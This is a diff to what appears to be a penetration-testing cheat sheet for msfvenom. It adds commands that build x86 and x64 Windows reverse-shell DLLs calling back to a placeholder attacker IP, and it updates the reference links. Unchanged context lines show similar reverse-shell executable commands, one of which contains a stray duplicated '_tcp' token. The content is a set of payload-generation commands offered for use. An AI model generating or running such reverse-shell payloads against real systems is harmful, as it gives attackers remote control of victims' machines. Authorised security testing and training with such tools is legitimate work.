@@ -15,6 +15,9 @@ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> 
 
 # Exe
 msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe
+
+# Dll
+msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f dll -o revshell.dll
 ```
 
 #### Bind
@@ -36,6 +39,9 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp  LHOST=<KALI_IP> LPORT=<LOCAL_P
 
 # Exe
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp _tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f exe -o revshell.exe
+
+# Dll
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<LOCAL_PORT> -f dll -o revshell.dll
 ```
 
 #### Bind
@@ -46,5 +52,5 @@ TBD
 
 ## Links
 
-[HackNotes - Msfvenom](https://nozerobit.gitbook.io/hacknotes/shells/msfvenom)
-[MSFVenom](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
+- [HackTricks - MSFVenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
+- [infinitelogins - MSFVenom](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
